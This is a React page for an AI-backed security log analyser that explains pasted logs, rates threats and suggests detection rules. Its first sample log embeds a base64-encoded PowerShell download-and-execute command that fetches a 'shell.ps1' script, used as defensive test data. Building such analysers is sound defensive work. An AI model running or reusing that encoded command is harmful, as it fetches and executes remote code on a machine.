'use client'

import { useState } from 'react'

const FORMATS = ['Auto-detect','Sysmon XML','Windows Event Log','Azure AD Sign-in','Firewall log','Splunk result','AWS CloudTrail']
const SAMPLES = [
  {label:'Sysmon Event 1', log:`<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System><EventID>1</EventID></System>
  <EventData>
    <Data Name="Image">C:\\Windows\\System32\\cmd.exe</Data>
    <Data Name="CommandLine">cmd.exe /c powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=</Data>
    <Data Name="ParentImage">C:\\Windows\\explorer.exe</Data>
    <Data Name="User">CORP\\jsmith</Data>
  </EventData>
</Event>`},
  {label:'Security Event 4625', log:`{ "EventID": 4625, "AccountName": "administrator", "WorkstationName": "DESKTOP-ABC123", "IpAddress": "185.220.101.45", "LogonType": 3, "FailureReason": "Unknown user name or bad password", "TimeGenerated": "2026-05-16T00:14:22Z" }`},
  {label:'Azure AD Sign-in', log:`{ "userPrincipalName": "john.smith@company.com", "appDisplayName": "Microsoft Teams", "status": { "failureReason": "Invalid credentials", "errorCode": 50126 }, "location": { "city": "Moscow", "countryOrRegion": "RU" }, "ipAddress": "185.220.101.45", "conditionalAccessStatus": "notApplied", "createdDateTime": "2026-05-16T00:14:22Z" }`},
]

function esc(s: string) { return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;') }

const THREAT_COLORS: Record<string, {bg:string;fg:string;bd:string}> = {
  Critical: {bg:'var(--red-bg)',    fg:'var(--red)',    bd:'var(--red-bd)'},
  High:     {bg:'var(--red-bg)',    fg:'var(--red)',    bd:'var(--red-bd)'},
  Medium:   {bg:'#fff7ed',          fg:'#c2410c',       bd:'#fed7aa'},
  Low:      {bg:'var(--blue-bg)',   fg:'var(--blue)',   bd:'var(--blue-bd)'},
  Benign:   {bg:'var(--green-bg)',  fg:'var(--green)',  bd:'var(--green-bd)'},
}

export default function AnalyserPage() {
  const [log,      setLog]      = useState('')
  const [format,   setFormat]   = useState('Auto-detect')
  const [loading,  setLoading]  = useState(false)
  const [error,    setError]    = useState('')
  const [result,   setResult]   = useState<any>(null)
  const [model,    setModel]    = useState('')

  async function analyse() {
    if (!log.trim() || log.trim().length < 20) { setError('Paste a log entry to analyse (min 20 characters)'); return }
    setLoading(true); setError(''); setResult(null)
    try {
      const res = await fetch('/api/analyse', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({ log, format }),
      })
      const data = await res.json()
      if (!res.ok) throw new Error(data.error || 'Analysis failed')
      setResult(data.analysis)
      setModel(data.model_used)
    } catch(e: any) {
      setError(e.message)
    } finally {
      setLoading(false)
    }
  }

  function prefillGenerate() {
    if (!result?.detection_scenario) return
    window.location.href = '/generate?prefill=' + encodeURIComponent(result.detection_scenario)
  }

  const tColor = result ? (THREAT_COLORS[result.threat_level] || THREAT_COLORS.Low) : null

  return (
    <div style={{display:'grid', gridTemplateColumns:'1fr 1fr', minHeight:'calc(100vh - 48px)', gap:0}}>

      {/* Input side */}
      <div style={{padding:'1.25rem', borderRight:'1px solid var(--border)', display:'flex', flexDirection:'column', gap:'1rem'}}>
        <div style={{background:'var(--bg4)', border:'1px solid var(--border)', borderRadius:12, padding:'1.1rem', display:'flex', flexDirection:'column', gap:'.75rem'}}>
          <div>
            <div style={{fontSize:'.88rem', fontWeight:700, color:'var(--text)', marginBottom:'.25rem'}}> Log Analyser</div>
            <div style={{fontSize:'.75rem', color:'var(--muted)'}}>Paste any raw log — AI explains what happened, identifies threats, and suggests a detection rule.</div>
          </div>

          <div>
            <div style={{fontSize:'.67rem', color:'var(--muted)', marginBottom:'.28rem'}}>Log format</div>
            <select value={format} onChange={e=>setFormat(e.target.value)}
              style={{width:'100%', background:'var(--bg)', border:'1px solid var(--border2)', borderRadius:7, padding:'.48rem .7rem', color:'var(--text)', fontSize:'.78rem', outline:'none', fontFamily:'inherit', cursor:'pointer'}}>
              {FORMATS.map(f=><option key={f} value={f}>{f}</option>)}
            </select>
          </div>

          <div style={{position:'relative'}}>
            <textarea value={log} onChange={e=>setLog(e.target.value)} rows={14}
              placeholder="Paste your raw log here...&#10;&#10;Examples: Sysmon Event XML, Windows Security Event JSON, Azure AD sign-in log, firewall deny log, Splunk result"
              style={{width:'100%', background:'var(--bg)', border:'1px solid var(--border2)', borderRadius:9, padding:'.85rem .9rem', color:'var(--text)', fontSize:'.75rem', outline:'none', resize:'none', lineHeight:1.7, fontFamily:'var(--font-mono)', transition:'border-color .2s'}}
              onFocus={e=>e.target.style.borderColor='rgba(249,115,22,.45)'}
              onBlur={e=>e.target.style.borderColor='var(--border2)'}/>
          </div>

          {/* Sample logs */}
          <div>
            <div style={{fontSize:'.65rem', color:'var(--muted)', marginBottom:'.35rem'}}>Load sample log:</div>
            <div style={{display:'flex', gap:'.35rem', flexWrap:'wrap'}}>
              {SAMPLES.map(s=>(
                <button key={s.label} onClick={()=>setLog(s.log)}
                  style={{padding:'.22rem .58rem', borderRadius:5, border:'1px solid var(--border2)', background:'var(--bg)', color:'var(--muted)', fontSize:'.67rem', cursor:'pointer', fontFamily:'inherit', transition:'all .12s'}}
                  onMouseEnter={e=>{(e.target as any).style.borderColor='rgba(249,115,22,.4)';(e.target as any).style.color='#f97316'}}
                  onMouseLeave={e=>{(e.target as any).style.borderColor='var(--border2)';(e.target as any).style.color='var(--muted)'}}>
                  {s.label}
                </button>
              ))}
            </div>
          </div>

          {error && (
            <div style={{background:'var(--red-bg)', border:'1px solid var(--red-bd)', borderRadius:7, padding:'.55rem .8rem', fontSize:'.78rem', color:'var(--red)'}}>{error}</div>
          )}

          <button onClick={analyse} disabled={loading}
            style={{padding:'.82rem', background:loading?'var(--muted2)':'#f97316', border:'none', borderRadius:9, color:'#fff', fontWeight:700, fontSize:'.88rem', cursor:loading?'not-allowed':'pointer', fontFamily:'inherit', display:'flex', alignItems:'center', justifyContent:'center', gap:'.5rem', boxShadow:loading?'none':'0 3px 12px rgba(249,115,22,.28)'}}>
            {loading ? (
              <><span style={{width:14,height:14,border:'2px solid rgba(255,255,255,.3)',borderTopColor:'#fff',borderRadius:'50%',display:'inline-block',animation:'spin .65s linear infinite'}}/>Analysing...</>
            ) : ' Analyse Log'}
          </button>
        </div>
      </div>

      {/* Result side */}
      <div style={{padding:'1.25rem', overflowY:'auto', background:'var(--bg)'}}>
        {!result && !loading && (
          <div style={{display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', minHeight:'60vh', gap:'.75rem', textAlign:'center'}}>
            <div style={{fontSize:'2.5rem', opacity:.2}}></div>
            <div style={{fontSize:'.92rem', fontWeight:600, color:'var(--text2)'}}>Paste a log to analyse</div>
            <div style={{fontSize:'.78rem', color:'var(--muted)', maxWidth:280, lineHeight:1.6}}>Supports Sysmon, Windows Event Logs, Azure AD, firewall logs, and more.</div>
          </div>
        )}

        {loading && (
          <div style={{display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', minHeight:'60vh', gap:.85}}>
            <div style={{width:32,height:32,border:'2.5px solid var(--border2)',borderTopColor:'#f97316',borderRadius:'50%',animation:'spin .8s linear infinite'}}/>
            <div style={{fontSize:'.78rem', color:'var(--muted)', marginTop:'.5rem'}}>Analysing log entry...</div>
          </div>
        )}

        {result && (
          <div style={{display:'flex', flexDirection:'column', gap:'1rem', maxWidth:640}}>

            {/* Threat level banner */}
            <div style={{background:tColor!.bg, border:'1px solid '+tColor!.bd, borderRadius:12, padding:'1rem 1.15rem', display:'flex', alignItems:'center', justifyContent:'space-between', gap:'1rem'}}>
              <div>
                <div style={{fontSize:'.65rem', fontWeight:700, textTransform:'uppercase', letterSpacing:'.08em', color:tColor!.fg, marginBottom:'.2rem'}}>Threat Level</div>
                <div style={{fontSize:'1.5rem', fontWeight:800, color:tColor!.fg, letterSpacing:'-.02em'}}>{result.threat_level}</div>
                <div style={{fontSize:'.75rem', color:tColor!.fg, opacity:.8, marginTop:'.2rem'}}>{result.threat_level_reason}</div>
              </div>
              <div style={{fontSize:'2rem', opacity:.6}}>
                {result.threat_level === 'Critical' || result.threat_level === 'High' ? '' : result.threat_level === 'Medium' ? '' : result.threat_level === 'Low' ? 'ℹ' : ''}
              </div>
            </div>

            {/* Analysis card */}
            <div style={{background:'var(--bg4)', border:'1px solid var(--border)', borderRadius:12, overflow:'hidden'}}>
              {[
                {label:'Summary', content:result.summary},
                {label:'What happened', content:result.what_happened},
                {label:'Analyst notes — check next', content:result.analyst_notes},
              ].map(sec => sec.content && (
                <div key={sec.label} style={{padding:'.85rem 1.1rem', borderBottom:'1px solid var(--border)'}}>
                  <div style={{fontSize:'.62rem', fontWeight:700, textTransform:'uppercase', letterSpacing:'.09em', color:'var(--muted)', marginBottom:'.4rem'}}>{sec.label}</div>
                  <p style={{fontSize:'.82rem', color:'var(--text2)', lineHeight:1.7, margin:0}}>{esc(sec.content)}</p>
                </div>
              ))}

              {/* MITRE techniques */}
              {result.mitre_techniques?.length > 0 && (
                <div style={{padding:'.85rem 1.1rem', borderBottom:'1px solid var(--border)'}}>
                  <div style={{fontSize:'.62rem', fontWeight:700, textTransform:'uppercase', letterSpacing:'.09em', color:'var(--muted)', marginBottom:'.5rem'}}>MITRE ATT&CK techniques matched</div>
                  <div style={{display:'flex', flexWrap:'wrap', gap:'.4rem'}}>
                    {result.mitre_techniques.map((t: any, i: number) => (
                      <span key={i} style={{padding:'.2rem .6rem', borderRadius:5, fontSize:'.68rem', background:'var(--blue-bg)', color:'var(--blue)', border:'1px solid var(--blue-bd)', fontFamily:'var(--font-mono)'}}>
                        {t.id} {t.name}
                      </span>
                    ))}
                  </div>
                </div>
              )}

              {/* Indicators */}
              {result.indicators?.length > 0 && (
                <div style={{padding:'.85rem 1.1rem', borderBottom:'1px solid var(--border)'}}>
                  <div style={{fontSize:'.62rem', fontWeight:700, textTransform:'uppercase', letterSpacing:'.09em', color:'var(--muted)', marginBottom:'.5rem'}}>Suspicious indicators found</div>
                  <div style={{display:'flex', flexDirection:'column', gap:'.3rem'}}>
                    {result.indicators.map((ind: string, i: number) => (
                      <code key={i} style={{fontSize:'.72rem', fontFamily:'var(--font-mono)', background:'var(--bg3)', padding:'.2rem .5rem', borderRadius:4, color:'var(--red)', wordBreak:'break-all', display:'block'}}>{esc(ind)}</code>
                    ))}
                  </div>
                </div>
              )}

              {/* Generate detection CTA */}
              {result.generate_detection && result.detection_scenario && (
                <div style={{padding:'.85rem 1.1rem', background:'rgba(249,115,22,.05)'}}>
                  <div style={{fontSize:'.62rem', fontWeight:700, textTransform:'uppercase', letterSpacing:'.09em', color:'var(--muted)', marginBottom:'.45rem'}}>Suggested detection</div>
                  <p style={{fontSize:'.78rem', color:'var(--text2)', margin:'0 0 .65rem'}}>{esc(result.detection_scenario)}</p>
                  <button onClick={prefillGenerate}
                    style={{padding:'.5rem 1rem', background:'#f97316', border:'none', borderRadius:7, color:'#fff', fontWeight:600, fontSize:'.78rem', cursor:'pointer', fontFamily:'inherit'}}>
                    Generate Detection Rule from This Log
                  </button>
                </div>
              )}
            </div>

            {model && <div style={{fontSize:'.65rem', color:'var(--muted2)', fontFamily:'var(--font-mono)'}}>Analysed by: {model}</div>}
          </div>
        )}
      </div>

      <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
    </div>
  )
}
